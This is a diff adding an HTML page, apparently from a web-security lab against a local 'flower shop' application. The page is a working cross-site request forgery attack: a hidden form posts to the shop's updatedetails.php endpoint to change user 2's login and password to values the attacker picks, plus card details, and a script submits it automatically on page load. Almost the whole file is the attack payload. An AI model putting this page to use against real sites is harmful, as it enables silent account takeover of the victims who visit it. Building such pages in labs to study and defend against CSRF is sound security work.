@@ -1,0 +1,31 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious Page</title>
+</head>
+<body>
+    <h1>Malicious Page</h1>
+    <p>This page contains a hidden form that will perform a CSRF attack on the flower shop application.</p>
+
+    <!-- Hidden form to perform CSRF attack -->
+    <form id="csrfForm" action="http://localhost/flowershop/updatedetails.php" method="POST">
+        <!-- Automatically obtain the userid from the cookie -->
+        <input type="hidden" name="userid" value="2">
+        <!-- Modify the login and password to the attacker's choice -->
+        <input type="hidden" name="login" value="byeMike">
+        <input type="hidden" name="password" value="ggMike">
+        <!-- Keep other fields unchanged -->
+        <input type="hidden" name="name" value="abcabc">
+        <input type="hidden" name="address" value="abcabc">
+        <input type="hidden" name="cardtype" value="visa">
+        <input type="hidden" name="cardnumber" value="1234123412341234">
+        <input type="hidden" name="expmonth" value="7">
+        <input type="hidden" name="expyear" value="2004">
+    </form>
+
+    <!-- Automatically submit the form -->
+    <script>document.getElementById("csrfForm").submit();</script>
+</body>
+</html>
